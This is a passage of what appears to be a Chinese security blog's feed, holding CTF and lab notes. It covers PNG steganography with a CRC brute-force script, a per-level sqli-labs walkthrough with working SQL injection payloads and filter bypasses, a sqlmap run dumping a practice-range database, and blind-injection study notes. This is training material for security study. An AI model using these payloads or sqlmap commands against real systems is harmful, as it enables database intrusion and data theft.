align="center">PLTE</td><td align="center">不允许</td><td align="center">第二个数据块，可选</td><td align="center">调色板数据块</td></tr><tr><td align="center">IDAT</td><td align="center">允许</td><td align="center">如果有调色板数据块，则是第三个数据块</td><td align="center">图像数据块</td></tr><tr><td align="center">IEND</td><td align="center">不允许</td><td align="center">最后一个数据块</td><td align="center">图像结束数据</td></tr></tbody></table><p>PNG图像文件中每一个数据块的格式都是相同的，分别由4个部分组成。</p><table><thead><tr><th align="center">字段名</th><th align="center">大小(字节)</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">Length(长度)</td><td align="center">4</td><td align="center">指定数据块中的数据长度</td></tr><tr><td align="center">Chunk Type Code(数据块类型码)</td><td align="center">4</td><td align="center">数据块类型，比如IHDR、PLTE、IDAT等</td></tr><tr><td align="center">Chunk Data(数据块数据)</td><td align="center">Length(由图像决定)</td><td align="center">存储数据</td></tr><tr><td align="center">CRC(循环冗余检测)</td><td align="center">4</td><td align="center">循环冗余码</td></tr></tbody></table><p>CRC循环冗余码生成是计算方式是通过Chunk Type Code和Chunk Data中的数据进行计算得到的，在CTF中有时可能需要修复CRC值，计算方式如下：<img src="https://img.xpctf.cn/img/20200714101458.png"></p><p><strong>IHDR</strong><br>文件头数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。文件头数据块由13字节组成，它的格式如下表所示。<img src="https://img.xpctf.cn/img/20200714102323.png"><br>其中我们需要了解的是前8个字节的内容，也就是Width和Height，出题人经常会去修改一张图片的高度或宽度使得一张图片显示不完整从而达到隐藏信息的目的。</p><p><strong>IDAT</strong><br>图像数据块IDAT：它存储着实际的图像数据，在数据流中可包含多个连续顺序的图像数据块，一个png图像包含多个IDAT数据块，但只有一个IDAT块被充满时，才会继续新的块。在题目中如果遇到长度和其他块不同时应该引起注意。</p><p><strong>IEND</strong><br>PNG的图像结束数据是用来标记PNG文件结束，并且必须放在文件尾部，由12个字节组成。一般情况下，所有的PNG图像结束数据块的十六进制数值都是一样的，IEND数据块的长度总是00 00 00 00，数据标识总是49 45 4E 44，因此，CRC码也总是AE 42 60 82。出题人可能修改该结构，导致文件无法打开。</p><h3 id="3-png常见隐写方式"><a href="#3-png常见隐写方式" class="headerlink" title="3. png常见隐写方式"></a>3. png常见隐写方式</h3><ul><li>字符附加和文件结合<br><img src="https://img.xpctf.cn/img/20200714114423.png"></li><li>基于PNG文件格式的隐写<br><img src="https://img.xpctf.cn/img/20200714150520.png"></li><li>基于LSB的图片隐写<br><img src="https://img.xpctf.cn/img/20200714151352.png"></li><li>图片容差隐写<br><img src="https://img.xpctf.cn/img/20200714151830.png"></li><li>图层叠加<br><img src="https://img.xpctf.cn/img/20200714152032.png"></li><li>数字水印隐写<br><img src="https://img.xpctf.cn/img/20200714152700.png"></li></ul><h3 id="4-png隐写实战"><a href="#4-png隐写实战" class="headerlink" title="4. png隐写实战"></a>4. png隐写实战</h3><h4 id="4-1-IHDR修复"><a href="#4-1-IHDR修复" class="headerlink" title="4.1 IHDR修复"></a>4.1 IHDR修复</h4><p>通过PCRT检测图片的IHDR是否正确，不正确可能是修改了高宽和crc校验值。如果是修改了高宽，修改后即可显示隐藏内容，使用脚本爆破正确的高宽。在Windows下修改了crc是可以正常打开的，但是在linux下无法打开。<br>PCRT命令：py -2 PCRT.py -v -i IHDR.png</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">misc = <span class="built_in">open</span>(<span class="string">&quot;fff.png&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">        data = misc[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>,i) + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>,j) + misc[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> crc32 == <span class="number">0xfe1a5ab6</span>:</span><br><span class="line">            <span class="built_in">print</span> i,j</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;hex&quot;</span>,<span class="built_in">hex</span>(i),<span class="built_in">hex</span>(j)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs靶场详解笔记</title>
      <link href="/posts/caa2/"/>
      <url>/posts/caa2/</url>
      
        <content type="html"><![CDATA[<h2 id="SQLi-LABS-Page-1-Basic-Challenges"><a href="#SQLi-LABS-Page-1-Basic-Challenges" class="headerlink" title="SQLi-LABS Page-1(Basic Challenges)"></a>SQLi-LABS Page-1(Basic Challenges)</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>paylaod：<code>-1&#39; union select 1,2,3%23</code><br>知识点：闭合引号</p><h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>payload：<code>-1 union select 1,database(),3</code><br>知识点：union联合查询</p><h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>paylaod：<code>-1&#39;) union select 1,database(),3%23</code><br>插入<code>1&#39;</code>发现报错：<code>&#39;1&#39;&#39;) LIMIT 0,1</code>,告诉我们附近出错了，后面跟着括号，这时考虑闭合括号，注释掉后面的语句：<code>1&#39;)-- -</code>，这时返回就正常了，使用union联合查询即可。<br>知识点：闭合括号，闭合单引号。</p><h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>payload：<code>-1&quot;) union select 1,database(),3-- -</code><br>继续输入<code>1&#39;</code>,发现没反应，估计过滤了单引号，换成双引号试试，报错：<code>&quot;1&quot;&quot;) LIMIT 0,1</code>,1后面出现两个双引号，所以和上面一样的方法。<br>知识点：闭合括号，闭合双引号。</p><h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>paylaod：<code>1&#39; and (extractvalue(1,concat(1,(select database()))))-- -</code><br>输入1和2都返回<code>You are in...........</code>,可能时盲注，这是判断输入’判断类型。通过报错发现是字符型，接下来检测注入点，输入<code>1&#39; and 1=1-- -</code>回显正常，输入<code>1&#39; and 1=2-- -</code>无回显。存在的id回显都是一样的，无法使用union注入，考虑报错注入，使用extractvalue()报错成功注入。<br>知识点：extractvalue()报错注入，单引号闭合</p><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>payload：<code>2&quot; and (extractvalue(1,concat(1,(select database()))))-- -</code><br>和less一样，有盲注的特征，根据之前经验，猜测和上一题的一样，就相差一个双引号，直接输入1”测试，通过猜测验证了猜想。<br>知识点：extractvalue()报错注入，双引号闭合</p><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>paylaod：<code>1&#39;)) and (length(database())=8)%23</code>通过返回正常判断数据库长8位。<br>id&#x3D;1和id&#x3D;2发现返回值都是<code>You are in.... Use outfile......</code>，中文<code>您在...中。使用outfile ......</code>，这应该是提示，我们继续测试。输入单引号报错，但没有回显报错信息，只能考虑盲注。通过查看源码发现是两个括号((真狗))，通过<code>1&#39;)) and 1=2%23</code>发现存在盲注。<br>知识点：闭合多个括号，布尔盲注</p><h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><p>paylaod：<code>1&#39; and (length(database())=8)%23</code><br>和less-7一样，只需要去掉括号即可。检测是单引号还是双引号：输入单引号无回显，输入双引号有回显，则判断是单引号。<br>知识点：字符型布尔盲注</p><h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p>payload：<code>1&#39; and (length(database())=8) and sleep(5)-- -</code><br>通过<code>1 and 1=2</code>返回正常发现不是数字型注入(也有可能存在过滤)，尝试字符串。经过查看源码，发现无论什么都是输出一样的，此时union联合查询、报错注入、布尔盲注都不能用，只能试试时间盲注。通过<code>1&#39; and (sleep(5))-- -</code>发现存在延迟返回，可以使用时间盲注。<br>知识点：时间盲注</p><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>payload：<code>1&quot; and (length(database())=8) and sleep(5)-- -</code><br>通过题目发现是时间忙著，双引号。把上一题的payload单引号换成双引号就好了。<br>知识点：时间盲注</p><h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><p>payload：<code>1&#39; union select group_concat(table_name),2 from information_schema.tables where table_schema=database()-- -</code><br>和less-1一样，只是换成了post提交，使用hackbar测试是记得删除&amp;submit&#x3D;Submit，否则无法提交。<br>知识点：POST提交，单引号闭合，union联合查询</p><h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><p>payload：<code>11&quot;)union select 1,database() -- -</code>前面加11是为了前面报错，从而执行union的内容<br>登录一般是字符型，加入单引号没反应，换双引号试试，报错：<code>admin&quot;) LIMIT 0,1</code>,发现后面有个括号，加上括号即可使用union联合注入。<br>知识点：SQL语句闭合，union联合查询注入</p><h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><p>payload：<code>admin&#39;) and (extractvalue(1,concat(1,(select database()))))-- -</code><br>输入<code>admin&#39;</code>爆出<code>admin&#39;) LIMIT 0,1</code>错误，加上括号闭合语句，输入<code>admin&#39;) or 1=1-- -</code>发现无回显，猜测报错注入，使用extractvalue()试试，成功获得库名<code>XPATH syntax error: &#39;security&#39;</code>。<br>知识点：extractvalueb报错注入，闭合</p><h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><p>payload：<code>admin&quot; and (extractvalue(1,concat(1,(select database()))))-- -</code><br>输入<code>admin&#39;</code>无反应，输入<code>admin&quot;</code>抛出<code>admin&quot; LIMIT 0,1</code>错误，闭合双引号使用extractvalue报错注入。<br>知识点：单引号extractvalueb报错注入</p><h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><p>payload：<code>admin&#39; and length(database())=8 and sleep(5)-- -</code><br>输入全部东西都无回显，考虑时间盲注，先测试闭合。闭合后使用and短路可以使用sleep延迟注入，and运算当前面的表达式为假，就不会运行后面的语句。<br>知识点：时间盲注，and短路</p><h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><p>payload：<code>admin&quot;) and length(database())=8 and sleep(5)-- -</code><br>根据之前的经验，直接把上一题的payload单引号换成双引号，发现不行，加个括号即可造成延时。<br>知识点：时间盲注，and短路，双引号字符串</p><h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><p>payload：<code>passwd=admin&#39; or updatexml(1,concat(1,(select database())),2)-- -&amp;uname=admin</code><br>根据[PASSWORD RESET](密码重设)，判断是update更新，我之前没有update注入经验，我们先猜测一下后台sql语句再动手，再本地测试正常的update语句<code>update user set password=&#39;admin&#39; where username=&#39;admin&#39;</code>,先百度学习update注入吧。学习基础点<a href="https://blog.csdn.net/qq1124794084/article/details/84590929?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase">这里</a>，通过百度发现，使用or连接报错注入。User name是where条件后的，我们应该注入New Password,先判断是单引号还是双引号，输入admin’报错，说明是单引号，加上or连接updatexml函数即可报错注入。<br>知识点：update报错注入</p><h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><p>payload：<code>&#39; or updatexml(1,concat(1,(select database())),2))-- -</code><br>根据题目发现是报头注入-基于错误-字符串，百度学习了。参考文章<a href="https://blog.csdn.net/qq_35733751/article/details/106402960">点这里</a>，这篇文章刚讲了less-18。<br>学习后发现账号密码没法注入，后面还有一个把ua和，ip，username插入到数据库的语句，可以使用报错注入。前提得知道账号密码，通过前面得题我们知道有个账号密码都为admin得账号，这是就可以利用，后面的括号一定要闭合。<br>知识点：insert报错注入，闭合语句</p><h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><p>payload：<code>dir&#39;,extractvalue(1,concat(1,(select database()))))-- -</code><br>这个换成了Referer注入，但我们换了一种思路，我们注入的列名是ip那个列名，Referer是我们自定义的dir，然后连接报错注入语句，最后注释掉后面的语句。<br>知识点：insert报错注入，闭合语句</p><h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><p>payload：<code>uname=dir&#39; union select database(),101,102-- -</code><br>输入账号密码登录后显示账号信息和cookie，这时刷新还是登录状态，应该是使用cookie的账号去数据库查询了，删除cookies手动添加cookie<code>uname=admin</code>后请求，果然如此，之后构造union联合查询语句注入。<br>知识点：cookie union联合查询注入</p><h2 id="SQLi-LABS-Page-2-Adv-Injections"><a href="#SQLi-LABS-Page-2-Adv-Injections" class="headerlink" title="SQLi-LABS Page-2 (Adv Injections)"></a>SQLi-LABS Page-2 (Adv Injections)</h2><h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h3><p>payload：<code>uname=ZGlyJykgdW5pb24gc2VsZWN0IGRhdGFiYXNlKCksMTAxLDEwMi0tIC0=</code><br>先正常登录，提示我们<code>YOUR COOKIE : uname = YWRtaW4= and expires: Sun 05 Jul 2020 - 21:16:56</code>,使用base64解码<code>YWRtaW4=</code>刚好是我们登录的admin账号，猜测和20的区别就是多了个base64编码，把20的payload进行base64提交，爆出<code>union select database(),101,102-- -&#39;) LIMIT 0,1</code>错误，根据提示闭合括号即可。<br>知识点：cookie-base64-union联合查询注入</p><h3 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h3><p>payload：<code>uname=ZGlyIiB1bmlvbiBzZWxlY3QgZGF0YWJhc2UoKSwyLDMtLSAt</code><br>输入admin’的base64编码没反应，也没报错，试试admin”的base64，爆出<code>&quot;admin&quot;&quot; LIMIT 0,1</code>错误，闭合双引号即可。<br>知识点：cookie注入，base64，union，双引号字符型</p><h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><p>payload：<code>id=-1&#39; union select 1,2,3 and &#39;1&#39;=&#39;1</code><br>输入<code>1&#39;</code>爆出<code>&#39;1&#39;&#39; LIMIT 0,1</code>错误，使用<code>-- -</code>注释掉后面的语句，又爆出<code>&#39; LIMIT 0,1</code>错误，估计<code>-- -</code>被过滤了，使用#号注释，由于#号在浏览器有特殊含义，所以使用url编码后的%23，还是报错<code>&#39;1&#39;&#39; LIMIT 0,1</code>，%23也被干掉了。那我们使用自然闭合吧，最后发现<code>1&#39; and &#39;1&#39;=&#39;1</code>正常回显，拼接union联合查询。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//后台源码</span></span><br><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></table></figure><h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h3><p>payload：<code>admin&#39;#</code><br>是个登录框，登录后是修改密码的页面，我们从登录开始找注入点，经过几轮测试还是放弃了，在修改页面动手吧。修改密码肯定是update语句，分析current_password应该是where后的语句，重点在password和re_password，先试试password，经过测试使用hackbar插件好像不行了，用burp吧，后来查了百度说是二次注入，原文<a href="https://blog.csdn.net/weixin_45146120/article/details/100608575">点这里</a>，原来是注册账号的时候构造sql语句，等更新密码的时候php读取到用户名就可以进行注入，但是用户名不能超过20个字符。<br>我们在注册账号页面使用<code>admin&#39;#</code>注册，然后使用刚刚注册的账号登录修改密码，当数据库执行的时候是<code>UPDATE users SET PASSWORD=&#39;admin123&#39; where username=&#39;admin&#39;#&#39; and password=&#39;admin&#39;</code>,也就是说数据库执行了<code>UPDATE users SET PASSWORD=&#39;admin123&#39; where username=&#39;admin&#39;</code>,这条语句就是更新username为admin的密码，当我们注册的时候用户名为<code>用户名&#39;#</code>时，即可修改该用户的密码。<br>知识点：二次注入</p><h3 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h3><p>payload：<code>id=1&#39; anandd updatexml(1,concat(1,(select database())),2)-- -</code><br>根据报错提示，or和and被过滤，尝试双写绕过成功，可以使用union联合查询注入，但这里为了体现出and被过滤，使用了updatexml报错注入。<br>知识点：双写绕过，报错注入</p><h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h3><p>payload：<code>-1 union select 1,database(),3</code><br>看起来是25的升级版，没有了报错回显，经过测试发现是整数型，也是过滤了or和and，同样的栓双写绕过，使用oorrder by 3正常返回和oorrder by 4返回异常获得列名为3，然后使用union联合查询即可。<br>知识点：数字型union注入</p><h3 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h3><p>payload：<code>1&#39;anandd(updatexml(1,concat(1,database()),2))anandd&#39;1&#39;=&#39;1</code><br>测试后发现过滤：and or %0a %0b %0c %0d 空格，其中and和or可以双写绕过，使用报错注入可以使用空格，或者是括号绕过空格。<br>知识点：空格绕过，双写绕过，注释绕过</p><h3 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h3><p>payload：<code>1&#39;aandnd(length((select(database())))=8)aandnd&#39;1&#39;=&#39;1</code><br>和上面一样，这里没有了报错回显，所以不能使用报错注入了，因为union不能使用括号绕过(两个关键字)，所以使用盲注即可，思路想好了，重点是构造paylaod，由于不能使用空格，所以只能使用波尔盲注。<br>知识点：空格绕过，双写绕过，注释绕过，布尔盲注</p><h3 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h3><p>payload：<code>id=1&#39;and(extractvalue(1,concat(1,(selEct(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))))and&#39;1&#39;=&#39;1</code><br>这次过滤了select，使用双写没法绕过，但我发现and和or没有被过滤了，测试了一下大小写即可绕过select过滤，由于有报错回显，所以使用报错注入即可。<br>知识点：构造复杂payload，大小写绕过</p><h3 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h3><p>payload：<code>id=1&quot;and((selEct(length(group_concat(table_name)))from(information_schema.tables)where(table_schema=database()))=29)and&quot;1&quot;=&quot;1</code><br>输入1’正常返回，输入1”返回异常，所以判断是”字符串，还是不能使用空格，而且还没有报错回显，只能使用盲注，但是构造payload一定要细心。通过构造payload猜出该数据库的类名长度是29<br>知识点：构造复杂payload，大小写绕过，盲注</p><h3 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h3><p>payload：<code>1&#39;and((select(length(database())))=8)and &#39;1&#39;=&#39;1</code><br>该题还是过滤了空格，我使用%a0不知道为什么绕不过，应该是我mysql版本的原因，看了师傅们的解析应该可以使用union联合查询，但我使用的是盲注。<br>知识点：构造复杂payload，盲注</p><h3 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h3><p>payload：<code>0&#39;)union%0aunion%0aselect%0aselect%0a1,2,3%0aand(&#39;1&#39;=&#39;1</code><br>知识点：双写绕过，小括号字符串闭合<br>参考文章：<a href="https://blog.csdn.net/weixin_30437847/article/details/97564075?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase">sqli-labs(28)</a></p><h3 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h3><p>payload：<code>-1&#39; union select 1,2,(group_concat(table_name))from(information_schema.tables)where(table_Schema=database())--+</code><br>这关直接可以使用union联合查询注入，不知道考点在哪，度娘一下。</p><h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h3><p>payload：<code>-1&quot; union select 1,2,(group_concat(table_name))from(information_schema.tables)where(table_Schema=database())--+</code><br>和less29就一个引号只差，没啥好说的。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>易锦靶场新手区SQL注入</title>
      <link href="/posts/2f9a/"/>
      <url>/posts/2f9a/</url>
      
        <content type="html"><![CDATA[<h2 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h2><p>通过群里讲师得到，id&#x3D;95存在注入，其他不存在，我试了一下也是不存在。<br><a href="http://lab.yijincc.com:50006/?m=home&c=View&a=index&aid=95">http://lab.yijincc.com:50006/?m=home&c=View&a=index&aid=95</a></p><h2 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h2><p>通过id初步判断时数字型注入，输入95 and 1&#x3D;1,页面无异常<br><img src="https://img.xpctf.cn/img/20200701211641.png"><br>输入95 and 1&#x3D;2页面不存在，说明存在数字型注入<br><img src="https://img.xpctf.cn/img/20200701211818.png"></p><h2 id="获取返回列"><a href="#获取返回列" class="headerlink" title="获取返回列"></a>获取返回列</h2><p>经过测试发现order by 48回显正常(我的天48个)，union联合查询获取回显位置，payload：<code>95 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48</code><br><img src="https://img.xpctf.cn/img/20200701212420.png"><br>回显不是我们期待的，考虑过滤了union，使用异或测试union。<code>95^(length(&#39;union&#39;)=5)</code><br><img src="https://img.xpctf.cn/img/20200701212657.png"><br>如果未被过滤，最后运算结果应该是95，异或注入回显一致说明没有被过滤，但返回的不是aid为95的页面，是aid为94的页面，后来我发现没改aid，改成-95<br><img src="https://img.xpctf.cn/img/20200701212521.png"><br>改为95就404了，可能是过滤了select之类的，使用异或测试都没有被过滤。联想到一开始得到的结论 只有aid为95猜存在注入<br><img src="https://img.xpctf.cn/img/20200702084506.png"><br>后来我删了一个列，发现了报错注入，尝试了extractvalue报错注入无果<br><img src="https://img.xpctf.cn/img/20200702084931.png"><br>后来使用 floor注入发现成功了，payload：<code>and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x) a)</code><br><img src="https://img.xpctf.cn/img/20200702085136.png"></p><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>昨晚找到floor报错注入，今天又用了sqlmap来跑，通过指定参数来爆破<br>语句：py -3 sqlmap.py -u “<a href="http://lab.yijincc.com:50006/?m=home&c=View&a=index&aid=95">http://lab.yijincc.com:50006/?m=home&amp;c=View&amp;a=index&amp;aid=95</a>“ -p aid –batch<br>跑了一会发现三种注入方式，分别是布尔盲注，报错注入，时间盲注。<br><img src="https://img.xpctf.cn/img/20200702085619.png"><br>因为这是靶场，接下来就是脱库了，sqlmap比自己写脚本来的快，<br>语句：py -3 sqlmap.py -u “<a href="http://lab.yijincc.com:50006/?m=home&c=View&a=index&aid=95">http://lab.yijincc.com:50006/?m=home&amp;c=View&amp;a=index&amp;aid=95</a>“ -p aid –dump-all –batch</p><p><strong>测试结束</strong></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入学习笔记2</title>
      <link href="/posts/d106/"/>
      <url>/posts/d106/</url>
      
        <content type="html"><![CDATA[<h2 id="一、未知列名注入"><a href="#一、未知列名注入" class="headerlink" title="一、未知列名注入"></a>一、未知列名注入</h2><p>未知列名注入一般用于过滤column，通过不需要查询列名的方式来获取数据。</p><h3 id="1-union绕过列名"><a href="#1-union绕过列名" class="headerlink" title="1. union绕过列名"></a>1. union绕过列名</h3><p>payload：<code>id=-1 union select 1,a.2,3 from (select 1,2,3 union select * from user limit 1,1)a</code><br>分析payload要从最里面，最先执行的sql语句开始。<br>先看<code>select 1,2 union select * from flag</code>，该语句的执行效果如下<br><img src="https://img.xpctf.cn/img/20200701115547.png">表名变成是1，2，3 但我们要怎么获取到里面的数据呢，看第一个union查询的<code>a.2</code>，它派生表的别名，<code>.2</code>是第二个表，也就是user表的username列，<code>a.2</code>相当于查询了username列名。</p><h3 id="2-using报错注入"><a href="#2-using报错注入" class="headerlink" title="2. using报错注入"></a>2. using报错注入</h3><p>使用场景：未知列名<br>使用条件：报错回显</p><h4 id="2-1-join函数"><a href="#2-1-join函数" class="headerlink" title="2.1 join函数"></a>2.1 join函数</h4><p>join函数 用于把两个表连接起来，join on是把满足条件的连接起来。<br>join用法：select * from user join flag;</p><h4 id="2-2-using-函数用法"><a href="#2-2-using-函数用法" class="headerlink" title="2.2 using 函数用法"></a>2.2 using 函数用法</h4><p>using函数 和join函数组合使用，作用是过来相同列<br>用法：select * from user join flag using(id);</p><h4 id="2-3-别名查询"><a href="#2-3-别名查询" class="headerlink" title="2.3 别名查询"></a>2.3 别名查询</h4><p>原理：使用别名的时候，不允许出现相同的列名。<br>select 1,1;可以执行，不报错<br>select * from (select 1,1)a;报错</p><h4 id="2-4-using报错"><a href="#2-4-using报错" class="headerlink" title="2.4 using报错"></a>2.4 using报错</h4><p>根据别名查询不能存在相同列名的特性，我们可以构造相同列名来爆出列名。<br>payload：<code>select * from (select * from user as a join user as b)c;</code><br>这样即可爆出第一个相同的列名，使用using组合已知列名即可爆出其他列名。<br>payload：<code>select * from (select * from user as a join user as b using(id,username))c;</code><br>多个列名使用逗号分隔，在using函数内。</p><h2 id="二、OOB外带注入"><a href="#二、OOB外带注入" class="headerlink" title="二、OOB外带注入"></a>二、OOB外带注入</h2><h3 id="1-通配符注入"><a href="#1-通配符注入" class="headerlink" title="1. 通配符注入"></a>1. 通配符注入</h3><h4 id="1-1-通配符"><a href="#1-1-通配符" class="headerlink" title="1.1 通配符"></a>1.1 通配符</h4><p>在MySQL中搜索数据时，可以使用通配符代替多个字符，通配符必须和like一起使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%代替一个或多个字符</span><br><span class="line">_仅代替一个字符</span><br></pre></td></tr></table></figure><h4 id="1-1-like函数"><a href="#1-1-like函数" class="headerlink" title="1.1 like函数"></a>1.1 like函数</h4><p>like函数 主要用于在where语句中搜索指定的匹配模式。<br>用法：select * from user where username like ‘a%’;<br>payload：<code>password=admin&amp;username=1&#39; or 1=1 and password like &#39;i%&#39;%23</code><br>前提知道admin，如果存在注入，可以使用like猜密码。</p><h4 id="1-2-regex函数"><a href="#1-2-regex函数" class="headerlink" title="1.2 regex函数"></a>1.2 regex函数</h4><p>正则表的是，又称规则表达式。（regex、regexp或re），计算机科学的一个概念。正则表达式通常被用来检索、替换那些符合某个模式（规则）的文本。<br>实例：<code>select * from user where username regexp &#39;^a&#39;;</code><br>匹配username列里已a开头的列。<br>payload：<code>password=admin&amp;username=1&#39; or 1=1 and password regexp &#39;^i&#39;%23</code></p><h3 id="2-strcmp函数注入"><a href="#2-strcmp函数注入" class="headerlink" title="2. strcmp函数注入"></a>2. strcmp函数注入</h3><h4 id="2-1-strcmp函数"><a href="#2-1-strcmp函数" class="headerlink" title="2.1 strcmp函数"></a>2.1 strcmp函数</h4><p>strcmp函数 用于比较两个字符串的大小。<br>用法：select strcmp(‘a’,’b’);<br>当字符串相等时，返回0；当参数1大于参数2时，返回1；当参数1小于参数2时，返回-1。</p><h4 id="2-2-strcmp注入"><a href="#2-2-strcmp注入" class="headerlink" title="2.2 strcmp注入"></a>2.2 strcmp注入</h4><p>payload：<code>password=admin&amp;username=admin&#39;  and (strcmp((ascii(substr(password,1,1))),54))%23</code><br>当猜对时，strcmp返回0,经过and运算为假，所以返回账号密码错误。<br>当猜错时，不论strcmp返回-1还是1，再经过and运算后都是1，所以是密码错误。</p><h2 id="三、load-file读文件"><a href="#三、load-file读文件" class="headerlink" title="三、load_file读文件"></a>三、load_file读文件</h2><h3 id="1-文件操作基础"><a href="#1-文件操作基础" class="headerlink" title="1. 文件操作基础"></a>1. 文件操作基础</h3><h4 id="1-1-show的用法"><a href="#1-1-show的用法" class="headerlink" title="1.1 show的用法"></a>1.1 show的用法</h4><p>show databases;查看所有数据库<br>show tables;查看当前数据库的所有表<br>show 